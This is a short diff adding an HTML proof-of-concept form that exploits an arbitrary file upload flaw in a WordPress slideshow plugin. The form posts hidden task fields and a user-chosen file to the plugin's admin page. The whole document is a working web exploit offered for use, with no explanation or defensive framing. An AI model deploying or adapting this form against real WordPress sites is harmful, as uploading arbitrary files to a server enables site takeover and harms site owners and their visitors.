@@ -1,0 +1,12 @@
+
+<html>
+<body>
+<form action="http://[path to WordPress]/wp-admin/admin.php?page=slideshowpro_manage" method="POST" enctype="multipart/form-data">
+<input type="hidden" name="task" value="pro_add_new_album" />
+<input type="hidden" name="album_name" value="Arbitrary File Upload" />
+<input type="hidden" name="album_desc" value="Arbitrary File Upload" />
+<input type="file" name="album_img" value="" />
+<input type="submit" value="Submit" />
+</form>
+</body>
+</html>
